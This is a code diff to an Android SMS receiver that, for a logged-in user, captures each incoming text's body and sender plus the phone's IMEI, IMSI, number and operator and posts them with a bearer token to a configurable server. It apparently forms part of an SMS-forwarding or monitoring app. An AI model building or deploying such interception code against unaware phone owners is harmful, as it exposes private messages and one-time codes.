@@ -17,33 +17,46 @@ import okhttp3.RequestBody;
 
 public class SmsListener extends BroadcastReceiver {
 
+    int userId;
+
     @RequiresApi(api = Build.VERSION_CODES.M)
     @Override
     public void onReceive(Context context, Intent intent) {
 
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+        if(SaveSharedPreference.getLoggedStatus(context)) {
 
-            SmsMessage[] smsMessages;
-            smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
+            userId = SaveSharedPreference.getUserId(context);
 
-            for (SmsMessage message : smsMessages) {
+            if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
 
-                JSONObject clientInformation = getClientInformation(context);
+                SmsMessage[] smsMessages;
+                smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
 
-                try {
-                    clientInformation.put("MSG",message.getDisplayMessageBody());
-                    clientInformation.put("PHONENUMBER",message.getDisplayOriginatingAddress());
-                    clientInformation.put("TYPE","sms");
+                for (SmsMessage message : smsMessages) {
+
+                    JSONObject clientInformation = getClientInformation(context);
+
+                    try {
+                        clientInformation.put("MSG", message.getDisplayMessageBody());
+                        clientInformation.put("PHONENUMBER", message.getDisplayOriginatingAddress());
+                        clientInformation.put("TYPE", "sms");
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    MediaType MEDIA_TYPE = MediaType.parse("application/json; charset=utf-8");
+                    RequestBody body = RequestBody.create(MEDIA_TYPE, clientInformation.toString());
+                    String url = SaveSharedPreference.getUrl(context);
+                    String token = SaveSharedPreference.getToken(context);
+                    token = "Bearer " + token;
+
+                    try{
+                        Request request = new Request.Builder().url(url).post(body).header("Authorization", token).build();
+                        new insertMessageToDB().execute(request);
+                    }catch(IllegalArgumentException e){
+                        e.printStackTrace();
+                    }
                 }
-                catch (JSONException e) {
-                    e.printStackTrace();
-                }
-
-                MediaType MEDIA_TYPE = MediaType.parse("application/json; charset=utf-8");
-                RequestBody body = RequestBody.create(MEDIA_TYPE, clientInformation.toString());
-                Request request = new Request.Builder().url("http://192.168.10.179:8080/AndroidServer/Server").post(body).build();
-
-                new insertMessageToDB().execute(request);
             }
         }
     }
@@ -55,6 +68,7 @@ public class SmsListener extends BroadcastReceiver {
         String serviceName = Context.TELEPHONY_SERVICE;
         TelephonyManager m_telephonyManager = (TelephonyManager) context.getSystemService(serviceName);
         String IMEI, IMSI, OS, DEVICE, MODEL, PRODUCT, PNUMBER, OPERATOR;
+        int USERID;
 
         IMEI = m_telephonyManager.getDeviceId();
         IMSI = m_telephonyManager.getSubscriberId();
@@ -64,6 +78,7 @@ public class SmsListener extends BroadcastReceiver {
         PRODUCT = android.os.Build.PRODUCT;
         PNUMBER = m_telephonyManager.getLine1Number();
         OPERATOR = m_telephonyManager.getSimOperator();
+        USERID = userId;
 
         JSONObject clientInformation = new JSONObject();
         try {
@@ -76,6 +91,7 @@ public class SmsListener extends BroadcastReceiver {
             clientInformation.put("PNUMBER",PNUMBER);
             clientInformation.put("OPERATOR",OPERATOR);
             clientInformation.put("INCOMING",true);
+            clientInformation.put("USERID",USERID);
 
         } catch (JSONException e) {
             e.printStackTrace();
